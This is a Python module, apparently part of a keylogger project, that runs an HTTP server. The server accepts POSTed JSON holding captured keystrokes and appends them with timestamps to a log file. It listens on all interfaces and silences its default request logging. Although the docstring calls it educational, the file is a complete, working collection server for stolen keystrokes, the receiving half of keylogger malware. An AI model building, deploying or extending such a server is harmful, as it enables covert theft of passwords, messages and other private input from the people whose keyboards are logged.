"""
Keylogger HTTP Server Module.
Simple HTTP server to receive keylogger data.
Educational purposes only - Use only on systems you own or have permission to test.
"""

import json
import logging
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional

from .logger import get_logger


class KeyloggerHandler(BaseHTTPRequestHandler):
    """HTTP request handler for keylogger data."""

    def __init__(self, *args, log_file: str = "keylogger_log.txt", **kwargs):
        self.log_file = log_file
        self.logger = get_logger("keylogger.server")
        super().__init__(*args, **kwargs)

    def do_POST(self) -> None:
        """Handle POST requests with keylogger data."""
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length)

        try:
            data = json.loads(post_data.decode("utf-8"))
            keyboard_data = data.get("keyboardData", "")

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.logger.info(f"Received keylogger data: {len(keyboard_data)} chars")
            self.logger.debug(f"Data: {repr(keyboard_data)}")

            # Save to log file
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] {keyboard_data}\n")

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status": "ok"}')

        except json.JSONDecodeError:
            self.logger.error("Invalid JSON received")
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'{"error": "Invalid JSON"}')
        except Exception as e:
            self.logger.error(f"Error processing request: {e}")
            self.send_response(500)
            self.end_headers()

    def do_GET(self) -> None:
        """Handle GET requests with a simple status page."""
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(
            b"<h1>Keylogger Server Running</h1><p>POST keylogger data to /</p>"
        )

    def log_message(self, format: str, *args) -> None:
        """Suppress default log messages."""
        pass


def run_server(
    host: str = "0.0.0.0", port: int = 8080, log_file: str = "keylogger_log.txt"
) -> None:
    """Run the keylogger server."""
    logger = get_logger("keylogger.server")

    class Handler(KeyloggerHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, log_file=log_file, **kwargs)

    server = HTTPServer((host, port), Handler)
    logger.info(f"Keylogger server starting on {host}:{port}")
    logger.info("Press Ctrl+C to stop")
    logger.info("Waiting for keylogger connections...")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down server...")
        server.shutdown()


def main() -> None:
    """Main entry point for the server."""
    import argparse

    parser = argparse.ArgumentParser(description="Keylogger HTTP Server")
    parser.add_argument(
        "--host", default="0.0.0.0", help="Host to bind to (default: 0.0.0.0)"
    )
    parser.add_argument("--port", type=int, default=8080, help="Port to listen on (default: 8080)")
    parser.add_argument(
        "--log-file", default="keylogger_log.txt", help="Log file path (default: keylogger_log.txt)"
    )
    parser.add_argument(
        "--log-level",
        default="INFO",
        choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"],
        help="Log level (default: INFO)",
    )

    args = parser.parse_args()

    # Set log level
    logging.getLogger("keylogger.server").setLevel(getattr(logging, args.log_level))

    run_server(host=args.host, port=args.port, log_file=args.log_file)


if __name__ == "__main__":
    main()